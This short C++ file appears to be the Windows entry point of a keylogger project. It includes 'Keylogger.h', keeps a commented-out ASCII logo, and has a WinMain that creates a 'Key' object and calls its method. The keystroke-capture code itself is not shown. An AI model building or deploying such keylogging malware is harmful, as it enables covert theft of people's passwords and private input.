#include "Keylogger.h"
#include "aLibrary.h"

/*int Logo() {
	const string logo0 = "      ___        _              _   _     _        __      ";
	const string logo1 = "     / / |      | |       /\\   | \\ | |   | |       \\ \\    ";
	const string logo2 = "    / /| | _____| | __   /  \\  |  \\| | __| | ___  __\\ \\    ";
	const string logo3 = "   / / | |/ / _ \\ |/ /  / /\\ \\ | . ' |/ _' |/ _ \\/ __\\ \\   ";
	const string logo4 = "  / /  |   <  __/   <  / ____ \\| |\\  | (_| | (_) \\__ \\\\ \\  ";
	const string logo5 = " /_/   |_|\\_\\___|_|\\_\\/_/    \\_\\_| \\_|\\__,_|\\___/|___/ \\_\\ ";
	const string logo6 = "                                                           ";
	const string logo7 = "                                                           ";
	const string logo8 = "                                                           ";

	cout << logo0 << endl;
	cout << logo1 << endl;
	cout << logo2 << endl;
	cout << logo3 << endl;
	cout << logo4 << endl;
	cout << logo5 << endl;
	cout << logo6 << endl;
	cout << logo7 << endl;
	cout << logo8 << endl;

	return 0;
}*/

int WINAPI WinMain(
	HINSTANCE hIntance,
	HINSTANCE hInt,
	LPSTR CMD,
	int CmdShow
){
	Key key;
	Key *keylogger = &key;
	
	keylogger->but();

	return 0;
}